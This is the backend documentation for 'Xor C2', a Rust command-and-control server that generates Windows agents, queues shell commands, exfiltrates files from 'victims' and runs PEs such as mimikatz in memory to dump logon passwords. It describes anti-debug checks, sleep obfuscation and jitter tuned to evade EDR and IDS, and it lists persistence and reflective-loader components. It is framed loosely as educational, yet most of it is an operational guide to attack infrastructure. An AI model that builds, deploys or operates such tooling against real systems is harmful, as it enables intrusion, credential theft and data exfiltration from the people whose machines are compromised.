# Xor C2 - Backend Documentation

## Overview

The Xor C2 backend is a command and control (C2) server written in Rust. It consists of two main services:

- **Admin API** (Actix-web): Port 8088 - REST interface for operators
- **HTTP Listener** (Axum): Configurable port (default 80) - Communication with agents

## Overall Architecture

```mermaid
flowchart TB
    subgraph Operator["Operator"]
        GUI[GUI Client<br/>Rust + egui]
        CLI[REST API<br/>curl/Postman]
    end

    subgraph Backend["Teamserver - Rust"]
        subgraph AdminAPI["Admin API :8088"]
            subgraph Routes["routes/"]
                AppState[AppState]
                Router[Actix Router]
            end
            Auth[auth.rs<br/>JWT + bcrypt]
            subgraph Handlers["handlers/"]
                H1[auth.rs]
                H2[agents.rs]
                H3[tasks.rs]
                H4[files.rs]
                H5[listeners.rs]
                H6[victims.rs]
            end
            subgraph Database["db/"]
                DBMod[mod.rs]
                DBSchema[schema.rs]
                DBUsers[users.rs]
                DBAgents[agents.rs]
                DBListeners[listeners.rs]
                DBCommands[commands.rs]
                DBResults[results.rs]
            end
        end

        subgraph Listeners["Listeners"]
            HTTP[HTTP Listener<br/>Axum :80]
            HTTPS[HTTPS Listener<br/>Axum :443]
        end

        DB[(SQLite<br/>xor_c2.db)]
        Crypto[Encryption<br/>XOR + Base64]
    end

    subgraph Targets["Targets"]
        Agent1[Windows Agent<br/>EXE/DLL]
        Agent2[Windows Agent<br/>Shellcode/Service]
    end

    GUI --> Router
    CLI --> Router
    Router --> Auth
    Auth --> Handlers
    Handlers --> Database
    Database --> DB
    HTTP --> DB
    HTTPS --> DB
    HTTP --> Crypto
    HTTPS --> Crypto
    Agent1 --> HTTP
    Agent1 --> HTTPS
    Agent2 --> HTTP
    Agent2 --> HTTPS
```

## Communication Flow

```mermaid
sequenceDiagram
    participant Op as Operator
    participant API as Admin API<br/>:8088
    participant DB as SQLite
    participant Listener as HTTP Listener<br/>:80
    participant Agent as Agent

    Note over Op,Agent: 1. Authentication
    Op->>API: POST /api/login
    API->>DB: Verify credentials
    DB-->>API: Valid user
    API-->>Op: JWT Token

    Note over Op,Agent: 2. Sending a command
    Op->>API: POST /api/task<br/>{agent_id, command}
    API->>DB: INSERT commands<br/>status='pending'
    API-->>Op: command_id

    Note over Op,Agent: 3. Agent beacon
    Agent->>Listener: POST /api/update<br/>(XOR + Base64)
    Listener->>DB: SELECT commands<br/>WHERE status='pending'
    DB-->>Listener: Pending commands
    Listener->>DB: UPDATE status='sent'
    Listener-->>Agent: Commands (XOR + Base64)

    Note over Op,Agent: 4. Execution and result
    Agent->>Agent: Execute command
    Agent->>Listener: POST /api/result<br/>(XOR + Base64)
    Listener->>DB: INSERT results
    Listener->>DB: UPDATE status='completed'
    Listener-->>Agent: OK

    Note over Op,Agent: 5. Retrieving results
    Op->>API: GET /api/results/{agent_id}
    API->>DB: SELECT results
    DB-->>API: Results
    API-->>Op: JSON results
```

## Technology Stack

| Component | Technology |
|-----------|-----------|
| Language | Rust |
| Admin API | Actix-web |
| HTTP/HTTPS Listener | Axum + axum-server |
| TLS/SSL | Rustls |
| Certificates | rcgen (auto-generation) |
| Database | SQLite |
| Authentication | JWT (jsonwebtoken) |
| Password hashing | bcrypt |
| C2 encryption | XOR + Base64 |

## Admin API Endpoints

### Authentication

#### POST /health
Server health check.

**Authentication**: None

**Response**:
```json
{
  "status": "healthy",
  "service": "Xor C2",
  "version": "1.0.0"
}
```

---

#### POST /api/login
Authentication and JWT token generation.

**Authentication**: None

**Request**:
```json
{
  "username": "admin",
  "password": "admin123"
}
```

**Success response** (200):
```json
{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "message": "Login successful"
}
```

**Error response** (401):
```json
{
  "success": false,
  "token": null,
  "message": "Invalid credentials"
}
```

---

#### POST /api/logout
JWT token invalidation.

**Authentication**: Bearer Token

**Response**:
```json
{
  "success": true,
  "message": "Logged out successfully"
}
```

---

### Agent Management

#### GET /api/agents
Lists all registered agents (only those that have completed at least one check-in).

**Authentication**: Bearer Token

**Response**:
```json
[
  {
    "agent_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
    "hostname": "DESKTOP-ABC123",
    "username": "DOMAIN\\admin",
    "ip": "192.168.1.100",
    "process_name": "explorer.exe",
    "last_seen": "2025-01-25T10:30:00Z",
    "payload_type": "exe",
    "listener_name": "http"
  }
]
```

**Note**: Agents appear in this list only after their first check-in (beacon).

---

#### POST /api/generate
Generates a new compiled agent.

**Authentication**: Bearer Token

**Request**:
```json
{
  "listener_name": "http",
  "payload_type": "exe",
  "config": {
    "host": "192.168.1.10",
    "port": 80,
    "uri_path": "/api/update",
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "xor_key": "mysupersecretkey",
    "beacon_interval": 60,
    "anti_vm": false,
    "anti_debug": true,
    "sleep_obfuscation": true,
    "jitter_percent": 0.15,
    "headers": [["Accept", "application/json"]]
  }
}
```

**Available parameters**:

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `host` | string | - | C2 address |
| `port` | int | - | Listener port |
| `uri_path` | string | - | Beacon path |
| `user_agent` | string | - | HTTP User-Agent |
| `xor_key` | string | - | Encryption key |
| `beacon_interval` | int | 60 | Beacon interval (sec) |
| `anti_vm` | boolean | false | Virtualization detection |
| `anti_debug` | boolean | false | ⭐ Debug detection |
| `sleep_obfuscation` | boolean | false | ⭐ Sleep obfuscation |
| `jitter_percent` | float | 0.2 | ⭐ Beacon variation (±%) |
| `headers` | array | [] | Custom HTTP headers |

**Response**: Binary file (application/octet-stream)

```mermaid
flowchart LR
    A[Generation request] --> B[Listener validation]
    B --> C[Generate config.h<br/>with agent params]
    C --> D[Inject anti-debug &<br/>sleep obfuscation]
    D --> E[C++ compilation<br/>mingw32-g++]
    E --> F[Return binary]
```

**config.h implementation**:

```cpp
// Network
constexpr char XOR_SERVERS[] = "192.168.1.10";
constexpr int XOR_PORT = 80;
constexpr char RESULTS_PATH[] = "/api/update";
constexpr char USER_AGENT[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
constexpr char XOR_KEY[] = "mysupersecretkey";
constexpr int BEACON_INTERVAL = 60;

// Detection
constexpr bool ANTI_VM_ENABLED = false;
constexpr bool ANTI_DEBUG_ENABLED = true;      // ⭐ New
constexpr bool SLEEP_OBFUSCATION_ENABLED = true; // ⭐ New
constexpr float JITTER_PERCENT = 0.15f;        // ⭐ New

// Headers
constexpr char HEADER[] = "Accept: application/json";
```

**Note**: The agent is not registered in the database at generation time. It will be automatically registered on its first check-in (beacon).

---

### Command Execution

#### POST /api/task
Sends a command to an agent.

**Authentication**: Bearer Token

**Command types**:

| Type | Format | Description |
|------|--------|-------------|
| Shell | `whoami` | System command |
| Download | `/download C:\file.txt` | Downloads a file from the target |
| Upload | `/upload /local/file.exe` | Sends a file to the target |
| PE-Exec | `/pe-exec mimikatz.exe -args` | Executes a PE in memory |

**Shell request**:
```json
{
  "agent_id": "a1b2c3d4-...",
  "command": "whoami /all"
}
```

**Download request**:
```json
{
  "agent_id": "a1b2c3d4-...",
  "command": "/download C:\\Users\\admin\\Documents\\secret.pdf"
}
```

**Upload request**:
```json
{
  "agent_id": "a1b2c3d4-...",
  "command": "/upload /home/operator/payload.exe"
}
```

**PE-Exec request**:
```json
{
  "agent_id": "a1b2c3d4-...",
  "command": "/pe-exec /tools/mimikatz.exe sekurlsa::logonpasswords"
}
```

**Response**:
```json
{
  "success": true,
  "command_id": 42,
  "message": "Command queued"
}
```

---

#### GET /api/results/{agent_id}
Retrieves execution results for an agent.

**Authentication**: Bearer Token

**Response**:
```json
[
  {
    "id": 1,
    "command_id": 42,
    "output": "DOMAIN\\admin",
    "success": true,
    "types": "text",
    "filename": null,
    "received_at": "2025-01-25T10:35:00Z"
  },
  {
    "id": 2,
    "command_id": 43,
    "output": "eyJmaWxlbmFtZSI6InNlY3JldC5wZGYi...",
    "success": true,
    "types": "file",
    "filename": "secret.pdf",
    "received_at": "2025-01-25T10:36:00Z"
  }
]
```

---

### File Operations

#### POST /api/upload
Queues a file to be sent to an agent.

**Authentication**: Bearer Token

**Request**:
```json
{
  "agent_id": "a1b2c3d4-...",
  "filename": "payload.exe",
  "content": "TVqQAAMAAAAEAAAA//8AALgAAAA..."
}
```

**Response**:
```json
{
  "success": true,
  "message": "Upload queued",
  "command_id": 44,
  "filename": "payload.exe",
  "size": 73728
}
```

---

#### GET /api/download/{result_id}
Downloads a file retrieved from an agent.

**Authentication**: Bearer Token

**Response**: Binary file with headers:
- `Content-Type: application/octet-stream`
- `Content-Disposition: attachment; filename="secret.pdf"`

---

#### GET /api/view/{result_id}
Displays the content of a text file.

**Authentication**: Bearer Token

**Response (text)**:
```json
{
  "result_id": 2,
  "filename": "config.txt",
  "size": 1024,
  "type": "text",
  "content": "file content..."
}
```

**Response (binary)**:
```json
{
  "result_id": 3,
  "filename": "image.png",
  "size": 52428,
  "type": "binary",
  "message": "Binary file - use /api/download"
}
```

---

### Victim Management

#### GET /api/victims
Lists all compromised machines.

**Authentication**: Bearer Token

**Response**:
```json
[
  {
    "agent_id": "a1b2c3d4-...",
    "hostname": "DESKTOP-ABC123",
    "username": "DOMAIN\\admin",
    "os": "Windows 10",
    "ip_address": "192.168.1.100",
    "process_name": "explorer.exe",
    "first_seen": "2025-01-25T09:00:00Z",
    "last_seen": "2025-01-25T10:30:00Z"
  }
]
```

---

#### GET /api/victim/details/{agent_id}
Details of a specific victim.

**Authentication**: Bearer Token

---

### Listener Management

#### POST /api/add/listener
Creates a new HTTP or HTTPS listener.

**Authentication**: Bearer Token

**HTTP request**:
```json
{
  "listener_name": "http_listener",
  "listener_type": "http",
  "listener_ip": "0.0.0.0",
  "listener_port": 8080,
  "xor_key": "encryption_key_here",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "uri_paths": "/api/beacon",
  "headers": [["Accept", "application/json"]],
  "tls_cert": "",
  "tls_key": "",
  "tls_cert_chain": ""
}
```

**HTTPS request (with auto-generated certificate)**:
```json
{
  "listener_name": "https_listener",
  "listener_type": "https",
  "listener_ip": "0.0.0.0",
  "listener_port": 443,
  "xor_key": "encryption_key_here",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "uri_paths": "/api/beacon",
  "headers": [["Accept", "application/json"]],
  "tls_cert": "",
  "tls_key": "",
  "tls_cert_chain": ""
}
```

**HTTPS request (with custom certificate)**:
```json
{
  "listener_name": "https_custom",
  "listener_type": "https",
  "listener_ip": "0.0.0.0",
  "listener_port": 443,
  "xor_key": "encryption_key_here",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "uri_paths": "/api/beacon",
  "headers": [["Accept", "application/json"]],
  "tls_cert": "-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----",
  "tls_key": "-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----",
  "tls_cert_chain": "-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----"
}
```

**HTTP response**:
```json
{
  "success": true,
  "message": "HTTP Listener 'http_listener' added successfully. Restart server to activate."
}
```

**HTTPS response (auto-generation)**:
```json
{
  "success": true,
  "message": "HTTPS Listener 'https_listener' added successfully (self-signed certificate auto-generated). Restart server to activate.",
  "cert_auto_generated": true
}
```

**Note**: For HTTPS listeners, if `tls_cert` and `tls_key` are empty, a self-signed certificate is automatically generated with the following SANs:
- `{listener_name}.xor-c2.local` (CN)
- `localhost`
- `127.0.0.1`
- The listener IP (if different from 0.0.0.0/127.0.0.1)

---

## Listener Endpoints (Agent <-> Server)

These endpoints are used by agents to communicate with the server.

### POST /api/update (or configured URI)
Agent check-in beacon.

**Encryption**: XOR + Base64

**Request (decrypted)**:
```json
{
  "agent_id": "a1b2c3d4-...",
  "hostname": "DESKTOP-ABC123",
  "username": "DOMAIN\\admin",
  "process_name": "explorer.exe",
  "ip_address": "192.168.1.100",
  "results": ""
}
```

**Validation**:
- `User-Agent` header must match exactly the listener configuration

---

### POST /api/command
Retrieval of pending commands.

**Encryption**: XOR + Base64

**Request (decrypted)**:
```json
{
  "agent_id": "a1b2c3d4-..."
}
```

**Response (decrypted)**:
```json
{
  "success": true,
  "commands": [
    {"id": 42, "command": "'cmd':'whoami'"},
    {"id": 43, "command": "'download':'C:\\file.txt'"}
  ]
}
```

---

### POST /api/result
Submission of execution results.

**Encryption**: XOR + Base64

**Text request (decrypted)**:
```json
{
  "agent_id": "a1b2c3d4-...",
  "command_id": 42,
  "output": "DOMAIN\\admin",
  "success": true,
  "types": "text"
}
```

**File request (decrypted)**:
```json
{
  "agent_id": "a1b2c3d4-...",
  "command_id": 43,
  "output": "eyJmaWxlbmFtZSI6ImZpbGUudHh0IiwiY29udGVudCI6Ii4uLiJ9",
  "success": true,
  "types": "file"
}
```

---

### GET /api/pe-data/{command_id}
Retrieval of PE data for in-memory execution.

**Encryption**: XOR + Base64

**Response (decrypted)**:
```json
{
  "content": "TVqQAAMAAAAEAAAA...",
  "args": "c2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRz"
}
```

---

## Anti-Detection Features (New)

The backend supports generating agents with advanced protections against detection and analysis.

### Anti-Debug

When generating with `"anti_debug": true`, the server injects into `config.h`:

```cpp
constexpr bool ANTI_DEBUG_ENABLED = true;
```

**Agent implementation**:
- Method 1: `IsDebuggerPresent()` - Windows kernel API
- Method 2: PEB check (Process Environment Block)
  - x86_64: `__readgsqword(0x60)` → `peb->BeingDebugged`
  - x86: `__readfsdword(0x30)` → `peb->BeingDebugged`

**Behavior**:
- The agent checks at startup
- If it detects a debugger, it terminates silently
- Double protection: hard to bypass both methods

**Educational value**:
- Demonstration of internal Windows structures
- Illustration of anti-forensics techniques
- Understanding malware protections

---

### Sleep Obfuscation

When generating with `"sleep_obfuscation": true`, the server injects into `config.h`:

```cpp
constexpr bool SLEEP_OBFUSCATION_ENABLED = true;
constexpr float JITTER_PERCENT = 0.15f;
```

**Agent implementation**:
- Replaces classic `Sleep()` with `CreateThreadpoolTimer()`
- Adds a random variation (jitter) to the beacon interval
- Optionally encrypts sensitive memory regions (XOR 256-bit)

**Advantages**:

| Aspect | Without obfuscation | With obfuscation |
|--------|---------------------|-----------------|
| Traffic detection | Trivial (fixed timing) | Hard (variable timing) |
| Breakpoint | Sleep() detectable | Thread pool undetectable |
| Memory dump | RAM readable during sleep | RAM encrypted during sleep |
| IDS signature | Possible (timing pattern) | Impossible (random) |

**Configuration**:

```json
{
  "config": {
    "beacon_interval": 300,
    "sleep_obfuscation": true,
    "jitter_percent": 0.15
  }
}
```

**Result**:
- Beacon interval: 300 ± (300 × 0.15) = 255-345 seconds
- Each cycle varies randomly
- Network traffic less predictable for IDS/IPS

**Use cases**:
- Network traffic detection evasion
- Demonstration of obfuscation techniques
- Simulation of defended environments

---

### Recommended Configurations

**For POC/Learning**:
```json
{
  "anti_debug": false,
  "sleep_obfuscation": false,
  "jitter_percent": 0.0,
  "beacon_interval": 5
}
```

**For Defended Environment (EDR/IDS/IPS)**:
```json
{
  "anti_debug": true,
  "sleep_obfuscation": true,
  "jitter_percent": 0.25,
  "beacon_interval": 600
}
```

**Production Balance**:
```json
{
  "anti_debug": true,
  "sleep_obfuscation": true,
  "jitter_percent": 0.15,
  "beacon_interval": 300
}
```

---

## Database Schema

```mermaid
erDiagram
    users ||--o{ sessions : has
    users ||--o{ agents : creates
    users ||--o{ agents_log : performs

    agents ||--o{ commands : receives
    agents ||--o{ results : produces
    agents ||--|| victim_info : describes

    commands ||--o{ results : generates
    commands ||--o| pe_exec_data : has

    listeners ||--o{ agents : configures

    users {
        int id PK
        string username UK
        string password_hash
        datetime created_at
        datetime last_login
    }

    sessions {
        int id PK
        string token UK
        string username FK
        datetime created_at
        datetime expires_at
        string ip_address
    }

    agents {
        int id PK
        string agent_id UK
        string type
        string users FK
        string file_path
        datetime created_at
    }

    agents_log {
        int id PK
        string agent_id
        string action
        string details
        string username FK
        datetime timestamp
    }

    listeners {
        int id PK
        string name UK
        string listener_type
        string host
        int port
        string xor_key
        string user_agent
        string uri_paths
        text http_headers
        text tls_cert
        text tls_key
        text tls_cert_chain
        datetime created_at
    }

    victim_info {
        string agent_id PK
        string hostname
        string username
        string os
        string ip_address
        string process_name
        datetime first_seen
        datetime last_seen
    }

    commands {
        int id PK
        string agent_id
        text command
        string status
        datetime created_at
        datetime sent_at
        datetime completed_at
    }

    results {
        int id PK
        string agent_id
        int command_id FK
        text output
        bool success
        string types
        string filename
        datetime received_at
    }

    pe_exec_data {
        int command_id FK
        text pe_data
        datetime created_at
    }
```

## Encryption

### XOR Algorithm

```mermaid
flowchart LR
    subgraph Encryption
        A[JSON data] --> B[XOR with key]
        B --> C[Base64 encode]
        C --> D[HTTP Body]
    end

    subgraph Decryption
        E[HTTP Body] --> F[Base64 decode]
        F --> G[XOR with key]
        G --> H[JSON data]
    end
```

**Implementation**:
```rust
fn xor_transform(data: &[u8], key: &str) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key.bytes().nth(i % key.len()).unwrap())
        .collect()
}
```

**Note**: XOR is symmetric — the same operation encrypts and decrypts.

---

## Configuration

### config/config.json file

```json
{
  "server_port": 8088,
  "bind_address": "0.0.0.0",
  "agent_timeout": 300
}
```

### Environment variables

| Variable | Description | Default |
|----------|-------------|---------|
| `JWT_SECRET` | JWT signing key | `default-insecure-secret-change-me` |
| `JWT_EXP_HOURS` | Token lifetime (hours) | `1` |

---

## Directory Structure

```
C2-XOR/
├── docs/
│   ├── AGENT.md                     # Agent documentation
│   └── BACKEND.md                   # Backend documentation (this file)
│
├── xor-c2-server/                   # Backend (Teamserver)
│   ├── config/
│   │   └── config.json              # Server configuration
│   ├── src/
│   │   ├── main.rs                  # Entry point
│   │   ├── config/                  # Configuration module
│   │   │   ├── mod.rs               # Module exports
│   │   │   └── config.rs            # Configuration loading
│   │   ├── admin/
│   │   │   ├── mod.rs               # Admin module
│   │   │   ├── auth.rs              # JWT management (JwtManager)
│   │   │   ├── command_formatter.rs # Command formatting
│   │   │   ├── cert_generator.rs    # TLS certificate generation
│   │   │   ├── error.rs             # Server error types
│   │   │   ├── routes/              # API routes (modular)
│   │   │   │   ├── mod.rs           # Exports (start_server, AppState)
│   │   │   │   └── routes.rs        # AppState + server startup
│   │   │   ├── db/                  # Database (modular)
│   │   │   │   ├── mod.rs           # Database module exports
│   │   │   │   ├── schema.rs        # Schema and table initialization
│   │   │   │   ├── users.rs         # User operations
│   │   │   │   ├── agents.rs        # Agent operations
│   │   │   │   ├── listeners.rs     # Listener operations
│   │   │   │   ├── commands.rs      # Command operations
│   │   │   │   └── results.rs       # Result operations
│   │   │   ├── models/              # Request/response DTOs (modular)
│   │   │   │   └── mod.rs           # API data structures
│   │   │   └── handlers/            # REST API handlers (modular)
│   │   │       ├── mod.rs           # Handler exports
│   │   │       ├── auth.rs          # health_check, login, logout
│   │   │       ├── agents.rs        # list_agents, generate_agent, agent_checkin
│   │   │       ├── tasks.rs         # send_task, get_results
│   │   │       ├── files.rs         # upload, download, view
│   │   │       ├── listeners.rs     # add_listener (HTTP/HTTPS)
│   │   │       └── victims.rs       # list_victims, get_victim_details
│   │   ├── agents/
│   │   │   ├── mod.rs               # Agents module
│   │   │   └── agent_handler.rs     # Agent lifecycle + compilation
│   │   ├── listener/
│   │   │   ├── mod.rs               # Listener module
│   │   │   ├── http_listener.rs     # HTTP/HTTPS listener (Axum)
│   │   │   └── profile.rs           # Listener configuration
│   │   ├── helper/
│   │   │   ├── mod.rs               # Helper module
│   │   │   └── helper_listener.rs   # HTTP response helpers
│   │   └── encryption/
│   │       ├── mod.rs               # Encryption module
│   │       └── xor_cipher.rs        # XOR implementation
│   ├── downloads/                   # Files downloaded from agents
│   │   └── decrypt.py               # File decryption script
│   ├── agents_results/              # Generated agents (exe, dll)
│   ├── temp_uploads/                # Temporary files for upload
│   ├── Cargo.toml                   # Rust dependencies
│   └── xor_c2.db                    # SQLite database
│
├── xor-c2-client/                   # GUI Client (Operator)
│   ├── src/
│   │   ├── main.rs                  # Entry point
│   │   ├── api/                     # API module (modular)
│   │   │   ├── mod.rs               # ApiClient exports
│   │   │   ├── auth.rs              # login, logout
│   │   │   ├── agents.rs            # fetch_agents, generate_agent_with_config
│   │   │   ├── tasks.rs             # send_command
│   │   │   ├── results.rs           # fetch_results
│   │   │   ├── listeners.rs         # add_listener
│   │   │   ├── files.rs             # download_result_file
│   │   │   └── utils.rs             # decode_base64_if_needed, format_timestamp
│   │   ├── models.rs                # Data structures
│   │   ├── state.rs                 # Application state
│   │   ├── ui.rs                    # UI module
│   │   └── ui/
│   │       ├── login.rs             # Login interface
│   │       └── main_interface.rs    # Main interface
│   ├── download/
│   │   └── decrypt.py               # File decryption script
│   └── Cargo.toml                   # Rust dependencies
│
└── agent/                           # Windows Agent (C++)
    └── http/
        ├── main_exe.cpp             # EXE entry point
        ├── main_dll.cpp             # DLL entry point
        ├── main_svc.cpp             # Windows Service entry point
        ├── config.h                 # Configuration (generated)
        ├── http_client.cpp/h        # HTTP/HTTPS communication
        ├── crypt.cpp/h              # XOR encryption
        ├── base64.cpp/h             # Base64 encoding
        ├── task.cpp/h               # Task manager
        ├── pe-exec.cpp/h            # In-memory PE execution
        ├── persistence.cpp/h        # Persistence (T1547.001)
        ├── file_utils.cpp/h         # File operations
        ├── system_utils.cpp/h       # System information
        ├── vm_detection.cpp         # VM detection (7 methods)
        └── ReflectiveLoader/
            ├── shellcodize.py       # DLL → Shellcode converter
            └── DllLoaderShellcode/
                └── Loader/
                    ├── ReflectiveLoader.cpp
                    └── ReflectiveLoader.h
```

---

## Security

### Strengths
- JWT authentication with expiration
- Session validation in the database
- bcrypt password hashing
- User-Agent validation on listeners
- PE signature check (MZ header)
- Native HTTPS support with Rustls
- Auto-generation of self-signed certificates

### Points of attention
- XOR alone is cryptographically weak (should be strengthened for production)
- Default credentials (`admin/admin123`) must be changed immediately
- SQLite limits concurrency (consider PostgreSQL for scaling)
- Auto-generated self-signed certificates are not suitable for production
